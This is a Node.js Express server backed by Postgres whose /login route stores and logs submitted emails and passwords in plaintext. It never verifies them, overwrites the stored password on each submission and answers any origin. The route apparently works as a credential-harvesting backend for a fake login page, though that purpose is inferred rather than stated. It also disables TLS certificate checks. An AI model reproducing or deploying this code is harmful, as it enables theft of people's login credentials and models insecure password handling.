const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");
const path = require("path");
require("dotenv").config();

const app = express();

// Railway assigns dynamic port
const PORT = process.env.PORT || 3001;

app.use(express.json());
app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  })
);

// -------------------------------------------------------
// 1️⃣ CONNECT TO POSTGRES (NEON)
// -------------------------------------------------------
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
});

// Create table if missing
const initDb = async () => {
  try {
    const client = await pool.connect();

    await client.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    console.log("✅ Connected to Neon PostgreSQL & users table ready");
    client.release();
  } catch (err) {
    console.error("❌ Database initialization error:", err.message);
  }
};

initDb();

// -------------------------------------------------------
// 2️⃣ LOGIN ROUTE (SAVE EMAIL + PASSWORD)
// -------------------------------------------------------
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  console.log("📥 Received login:", email, password);

  if (!email || !password) {
    return res.status(400).json({
      success: false,
      message: "Email and password required",
    });
  }

  try {
    await pool.query(
      `
      INSERT INTO users (email, password)
      VALUES ($1, $2)
      ON CONFLICT (email)
      DO UPDATE SET password = EXCLUDED.password,
                    created_at = CURRENT_TIMESTAMP;
    `,
      [email, password]
    );

    console.log("💾 Saved login to database");
    res.json({ success: true, message: "Saved successfully" });
  } catch (err) {
    console.error("❌ DB Save Error:", err.message);
    res.status(500).json({
      success: false,
      message: "Database error",
      details: err.message,
    });
  }
});

// -------------------------------------------------------
// 3️⃣ ROOT ROUTE (TEST)
// -------------------------------------------------------
app.get("/", (req, res) => {
  res.send("🚀 Backend is running on Railway!");
});

// -------------------------------------------------------
// 4️⃣ START SERVER (Railway Compatible)
// -------------------------------------------------------
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
